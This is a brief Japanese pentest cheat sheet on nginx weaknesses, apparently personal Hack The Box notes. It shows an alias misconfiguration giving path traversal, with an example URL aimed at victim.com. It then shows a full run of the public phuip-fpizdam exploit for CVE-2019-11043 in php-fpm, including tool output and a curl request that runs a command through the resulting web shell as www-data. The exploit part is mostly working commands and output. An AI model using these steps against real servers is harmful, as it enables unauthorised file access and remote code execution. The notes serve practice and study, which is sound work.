# Niginx
----

## Miss Configuration
* locationの設定ミスによるPath Traversal
* [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
  
  ```console
  location /i {
      alias /data/w3/images/;
  }
  ```
* http://victim.com/location_dir../path-to-fileでアクセス可能


## CVE-2019-11043(php-fpm)
* [ phuip-fpizdam](https://github.com/neex/phuip-fpizdam)
* Htb: static
  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Static]
  └──╼ $~/go/bin/phuip-fpizdam http://127.0.0.1:80/index.php
  2021/09/16 13:13:49 Base status code is 200
  2021/09/16 13:14:18 Status code 502 for qsl=1765, adding as a candidate
  2021/09/16 13:14:37 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
  2021/09/16 13:16:31 Attack params found: --qsl 1755 --pisos 200 --skip-detect
  2021/09/16 13:16:31 Trying to set "session.auto_start=0"...
  2021/09/16 13:16:57 Detect() returned attack params: --qsl 1755 --pisos 200 --skip-detect <-- REMEMBER THIS
  2021/09/16 13:16:57 Performing attack using php.ini settings...
  2021/09/16 13:17:20 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
  2021/09/16 13:17:20 Trying to cleanup /tmp/a...
  2021/09/16 13:17:23 Done!
  ┌─[rio@parrot]─[~/Htb/Static]
  └──╼ $curl "127.0.0.1/index.php?a=id"
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
  Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
  batch mode: /usr/bin/ersatool create|print|revoke CN
  ```

  